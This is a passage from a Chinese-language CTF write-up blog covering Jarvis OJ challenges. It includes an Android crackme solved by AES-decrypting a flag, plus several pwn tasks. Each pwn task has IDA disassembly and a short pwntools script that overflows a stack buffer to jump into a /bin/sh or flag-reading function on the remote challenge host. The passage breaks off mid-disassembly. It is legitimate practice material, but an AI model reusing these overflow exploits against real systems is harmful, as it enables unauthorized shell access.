.prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 22</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 21</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 23</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 24</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 4</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"str"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 27</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"content"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v1, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iget-object </span>v2, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 30</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"kk"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> sget-object </span>v2, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0, v1&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2, v3&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-object </span>v2</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 8</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"content"</span>    <span class="comment"># [B</span></span><br><span class="line"><span class="keyword">    .param</span> p2, <span class="string">"password"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 35</span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line"><span class="keyword">    .local</span> v4, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :try_start_0</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line"><span class="keyword">    .local</span> v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v2, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v2, v3, v7&#125;, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span>-&gt;&lt;init&gt;([B<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 39</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">"key"</span>:<span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v7&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;getInstance(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 40</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"cipher"</span>:<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v7, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v7, v2&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;init(I<span class="class">Ljava/security/Key;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, p1&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line"><span class="keyword">    .local</span> v6, <span class="string">"result"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v5, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v5, v6&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line">   <span class="keyword"> :try_end_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/NoSuchAlgorithmException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_1</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/NoSuchPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/InvalidKeyException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_4</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/IllegalBlockSizeException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_2</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/BadPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .end local</span> v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .local</span> v5, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> move-object </span>v4, v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 46</span><br><span class="line"><span class="keyword">    .end local</span> v0    <span class="comment"># "cipher":Ljavax/crypto/Cipher;</span></span><br><span class="line"><span class="keyword">    .end local</span> v2    <span class="comment"># "key":Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"><span class="keyword">    .end local</span> v3    <span class="comment"># "keyStr":[B</span></span><br><span class="line"><span class="keyword">    .end local</span> v5    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .end local</span> v6    <span class="comment"># "result":[B</span></span><br><span class="line"><span class="keyword">    .restart</span> local v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">   <span class="built_in"> return-object </span>v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line">   <span class="keyword"> :catch_0</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"e"</span>:<span class="class">Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :goto_1</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/security/GeneralSecurityException;</span>-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line"><span class="keyword">    .end local</span> v1    <span class="comment"># "e":Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :catch_1</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_2</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_3</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_4</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>思路清晰，用python写出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">k=base64.b64decode(<span class="string">'cGhyYWNrICBjdGYgMjAxNg=='</span>)</span><br><span class="line">c=base64.b64decode(<span class="string">'sSNnx1UKbYrA1+MOrdtDTA=='</span>)</span><br><span class="line"></span><br><span class="line">aes_obj = AES.new(k,AES.MODE_CBC,<span class="string">'\x00'</span>*<span class="number">16</span>)</span><br><span class="line">flag = aes_obj.decrypt(c)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>flag:<code>PCTF{Sm4liRiver}</code></p>
<hr>
<p><center>===3月23日更新===</center></p>
<hr>
<h2 id="PWN-XMAN-level0"><a href="#PWN-XMAN-level0" class="headerlink" title="PWN - [XMAN]level0"></a>PWN - [XMAN]level0</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9881</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p>
</blockquote>
<p>算是打算开始学pwn了，先从基础的做起。</p>
<p>首先ida载入。</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004005C6                 public main</span><br><span class="line">.text:00000000004005C6 main            proc near               ; DATA XREF: _start+1Do</span><br><span class="line">.text:00000000004005C6</span><br><span class="line">.text:00000000004005C6 var_10          = qword ptr -10h</span><br><span class="line">.text:00000000004005C6 var_4           = dword ptr -4</span><br><span class="line">.text:00000000004005C6</span><br><span class="line">.text:00000000004005C6                 push    rbp</span><br><span class="line">.text:00000000004005C7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004005CA                 sub     rsp, 10h</span><br><span class="line">.text:00000000004005CE                 mov     [rbp+var_4], edi</span><br><span class="line">.text:00000000004005D1                 mov     [rbp+var_10], rsi</span><br><span class="line">.text:00000000004005D5                 mov     edx, 0Dh        ; n</span><br><span class="line">.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</span><br><span class="line">.text:00000000004005DF                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004005E4                 call    _write</span><br><span class="line">.text:00000000004005E9                 mov     eax, 0</span><br><span class="line">.text:00000000004005EE                 call    vulnerable_function</span><br><span class="line">.text:00000000004005F3                 leave</span><br><span class="line">.text:00000000004005F4                 retn</span><br><span class="line">.text:00000000004005F4 main            endp</span><br></pre></td></tr></table></figure>
<p>vulnerable_function函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A6                 public vulnerable_function</span><br><span class="line">.text:00000000004005A6 vulnerable_function proc near           ; CODE XREF: main+28p</span><br><span class="line">.text:00000000004005A6</span><br><span class="line">.text:00000000004005A6 buf             = byte ptr -80h</span><br><span class="line">.text:00000000004005A6</span><br><span class="line">.text:00000000004005A6                 push    rbp</span><br><span class="line">.text:00000000004005A7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:00000000004005AE                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004005B2                 mov     edx, 200h       ; nbytes</span><br><span class="line">.text:00000000004005B7                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004005BA                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004005BF                 call    _read</span><br><span class="line">.text:00000000004005C4                 leave</span><br><span class="line">.text:00000000004005C5                 retn</span><br><span class="line">.text:00000000004005C5 vulnerable_function endp</span><br></pre></td></tr></table></figure></p>
<p>还有一个没有被调用的callsystem函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure></p>
<p>过程是main函数先printf “helloworld”，然后调用vulnerable_function，在vulnerable_function函数中有存在缓冲区溢出的read函数，所以我们只要淹没保存的ebp，就能跳转到callsystem函数上。</p>
<p>用pwntools写出poc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = process('./level0')</span></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">cn.send(p64(<span class="number">0x0000000000400596</span>)*<span class="number">30</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>cat flag得到：<code>CTF{713ca3944e92180e0ef03171981dcd41}</code></p>
<h2 id="PWN-Tell-Me-Something"><a href="#PWN-Tell-Me-Something" class="headerlink" title="PWN - Tell Me Something"></a>PWN - Tell Me Something</h2><p>题目描述：</p>
<blockquote>
<p>Do you have something to tell me?</p>
<p>nc pwn.jarvisoj.com 9876</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/guestbook.d3d5869bd6fb04dd35b29c67426c0f05" target="_blank" rel="noopener">guestbook.d3d5869bd6fb04dd35b29c67426c0f05</a></p>
</blockquote>
<p>还是简单的栈溢出，和上题一样，淹没返回地址。</p>
<p>main函数调用read：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004E0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004004E0                 public main</span><br><span class="line">.text:00000000004004E0 main            proc near               ; DATA XREF: _start+1Do</span><br><span class="line">.text:00000000004004E0                 sub     rsp, 88h</span><br><span class="line">.text:00000000004004E7                 mov     edx, 14h        ; n</span><br><span class="line">.text:00000000004004EC                 mov     esi, offset aInputYourMessa ; &quot;Input your message:\n&quot;</span><br><span class="line">.text:00000000004004F1                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004004F6                 call    _write</span><br><span class="line">.text:00000000004004FB                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004004FE                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400503                 xor     edi, edi        ; fd</span><br><span class="line">.text:0000000000400505                 call    _read</span><br><span class="line">.text:000000000040050A                 mov     edx, 29h        ; n</span><br><span class="line">.text:000000000040050F                 mov     esi, offset aIHaveReceivedY ; &quot;I have received your message, Thank you&quot;...</span><br><span class="line">.text:0000000000400514                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000400519                 call    _write</span><br><span class="line">.text:000000000040051E                 add     rsp, 88h</span><br><span class="line">.text:0000000000400525                 retn</span><br><span class="line">.text:0000000000400525 main            endp</span><br></pre></td></tr></table></figure>
<p>目标函数good_game：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400620                 public good_game</span><br><span class="line">.text:0000000000400620 good_game       proc near</span><br><span class="line">.text:0000000000400620</span><br><span class="line">.text:0000000000400620 buf             = byte ptr -9</span><br><span class="line">.text:0000000000400620</span><br><span class="line">.text:0000000000400620                 push    rbx</span><br><span class="line">.text:0000000000400621                 mov     esi, offset modes ; &quot;r&quot;</span><br><span class="line">.text:0000000000400626                 mov     edi, offset filename ; &quot;flag.txt&quot;</span><br><span class="line">.text:000000000040062B                 sub     rsp, 10h</span><br><span class="line">.text:000000000040062F                 call    _fopen</span><br><span class="line">.text:0000000000400634                 mov     rbx, rax</span><br><span class="line">.text:0000000000400637                 jmp     short loc_400654</span><br><span class="line">.text:0000000000400637 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400639                 align 20h</span><br><span class="line">.text:0000000000400640</span><br><span class="line">.text:0000000000400640 loc_400640:                             ; CODE XREF: good_game+42j</span><br><span class="line">.text:0000000000400640                 lea     rsi, [rsp+18h+buf] ; buf</span><br><span class="line">.text:0000000000400645                 mov     edx, 1          ; n</span><br><span class="line">.text:000000000040064A                 mov     edi, 1          ; fd</span><br><span class="line">.text:000000000040064F                 call    _write</span><br><span class="line">.text:0000000000400654</span><br><span class="line">.text:0000000000400654 loc_400654:                             ; CODE XREF: good_game+17j</span><br><span class="line">.text:0000000000400654                 mov     rdi, rbx        ; stream</span><br><span class="line">.text:0000000000400657                 call    _fgetc</span><br><span class="line">.text:000000000040065C                 cmp     al, 0FFh</span><br><span class="line">.text:000000000040065E                 mov     [rsp+18h+buf], al</span><br><span class="line">.text:0000000000400662                 jnz     short loc_400640</span><br><span class="line">.text:0000000000400664                 add     rsp, 10h</span><br><span class="line">.text:0000000000400668                 pop     rbx</span><br><span class="line">.text:0000000000400669                 retn</span><br><span class="line">.text:0000000000400669 good_game       endp</span><br></pre></td></tr></table></figure></p>
<p>poc.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">cn = remote(&apos;pwn.jarvisoj.com&apos;,9876)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.send(p64(0x00400620)*30)</span><br><span class="line">cn.recv()</span><br><span class="line">print cn.recv()</span><br></pre></td></tr></table></figure></p>
<p>flag:<code>PCTF{This_is_J4st_Begin}</code></p>
<h2 id="PWN-XMAN-level1"><a href="#PWN-XMAN-level1" class="headerlink" title="PWN - [XMAN]level1"></a>PWN - [XMAN]level1</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9877</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level1.80eacdcd51aca92af7749d96efad7fb5" target="_blank" rel="noopener">level1.80eacdcd51aca92af7749d96efad7fb5</a></p>
</blockquote>
<p>先看一下有没有开什么奇怪的保护，然后发现什么保护都没开。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_883183d4f99257afcb27082f7fe1ebe9.png" alt=""></p>
<p>还是先看程序代码：</p>
<p>首先这次是一个32位的程序。</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:080484B7                 public main</span><br><span class="line">.text:080484B7 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line">.text:080484B7</span><br><span class="line">.text:080484B7 var_4           = dword ptr -4</span><br><span class="line">.text:080484B7 argc            = dword ptr  0Ch</span><br><span class="line">.text:080484B7 argv            = dword ptr  10h</span><br><span class="line">.text:080484B7 envp            = dword ptr  14h</span><br><span class="line">.text:080484B7</span><br><span class="line">.text:080484B7                 lea     ecx, [esp+4]</span><br><span class="line">.text:080484BB                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:080484BE                 push    dword ptr [ecx-4]</span><br><span class="line">.text:080484C1                 push    ebp</span><br><span class="line">.text:080484C2                 mov     ebp, esp</span><br><span class="line">.text:080484C4                 push    ecx</span><br><span class="line">.text:080484C5                 sub     esp, 4</span><br><span class="line">.text:080484C8                 call    vulnerable_function</span><br><span class="line">.text:080484CD                 sub     esp, 4</span><br><span class="line">.text:080484D0                 push    0Eh             ; n</span><br><span class="line">.text:080484D2                 push    offset aHelloWorld ; &quot;Hello, World!\n&quot;</span><br><span class="line">.text:080484D7                 push    1               ; fd</span><br><span class="line">.text:080484D9                 call    _write</span><br><span class="line">.text:080484DE                 add     esp, 10h</span><br><span class="line">.text:080484E1                 mov     eax, 0</span><br><span class="line">.text:080484E6                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:080484E9                 leave</span><br><span class="line">.text:080484EA                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484ED                 retn</span><br><span class="line">.text:080484ED main            endp</span><br></pre></td></tr></table></figure>
<p>先调用了vulnerable_function然后printf helloworld。</p>
<p>vulnerable_function函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:0804847B                 public vulnerable_function</span><br><span class="line">.text:0804847B vulnerable_function proc near           ; CODE XREF: main+11p</span><br><span class="line">.text:0804847B</span><br><span class="line">.text:0804847B buf             = byte ptr -88h</span><br><span class="line">.text:0804847B</span><br><span class="line">.text:0804847B                 push    ebp</span><br><span class="line">.text:0804847C                 mov     ebp, esp</span><br><span class="line">.text:0804847E                 sub     esp, 88h</span><br><span class="line">.text:08048484                 sub     esp, 8</span><br><span class="line">.text:08048487                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804848D                 push    eax</span><br><span class="line">.text:0804848E                 push    offset format   ; &quot;What&apos;s this:%p?\n&quot;</span><br><span class="line">.text:08048493                 call    _printf</span><br><span class="line">.text:08048498                 add     esp, 10h</span><br><span class="line">.text:0804849B                 sub     esp, 4</span><br><span class="line">.text:0804849E                 push    100h            ; nbytes</span><br><span class="line">.text:080484A3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484A9                 push    eax             ; buf</span><br><span class="line">.text:080484AA                 push    0               ; fd</span><br><span class="line">.text:080484AC                 call    _read</span><br><span 